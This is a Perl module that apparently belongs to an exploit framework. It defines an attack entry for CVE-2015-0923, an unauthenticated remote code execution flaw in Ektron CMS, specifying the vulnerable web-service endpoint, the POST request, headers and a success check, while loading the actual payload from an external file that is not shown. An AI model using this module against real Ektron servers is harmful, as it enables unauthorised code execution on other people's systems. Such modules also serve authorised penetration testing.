package EKTRON::MSF::EktronXsltExecWs;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "EktronXsltExecWs";

   my $DETECTION = {

   };

my $EXPLOIT = {
  CVE => "CVE-2015-0923",
  DESCRIPTION => " Ektron 8.5, 8.7 <= sp1, 9.0 < sp1 have

vulnerabilities in various operations within the ServerControlWS.asmx

web services. These vulnerabilities allow for RCE without authentication and

execute in the context of IIS on the remote system.

      ",
  MSF_MODULE => "ektron_xslt_exec_ws",
  PATHS => ["cms400min/"],
  REFERENCES => [
    "http://www.websecuritywatch.com/xxe-arbitrary-code-execution-in-ektron-cms/",
  ],
  TITLE => "Ektron 8.5, 8.7, 9.0 XSLT Transform Remote Code Execution",
  VARIABLES => {
    'PATH' =>       {
  DESCRIPTION => "The URI path of the Ektron CMS",
  VALUE => "/cms400min/",
},
  },

  TYPE => 'MSF',
  PLATFORM => 'WINDOWS',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'POST',
      PATH   => 'WorkArea/ServerControlWS.asmx',
      PAYLOAD      => read_file('MSFExploits/EKTRON/MSF/src/EktronXsltExecWs.payload', 1),
      TEXT   => 'Sending Exploit #1 Request : [POST] /WorkArea/ServerControlWS.asmx',
      HEADERS      => {
        'Referer' => 'http://127.0.0.1:80/WINDOWS/EKTRON/EktronXsltExecWs/',
        'Content-Type' => 'text/xml; charset=UTF-8',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
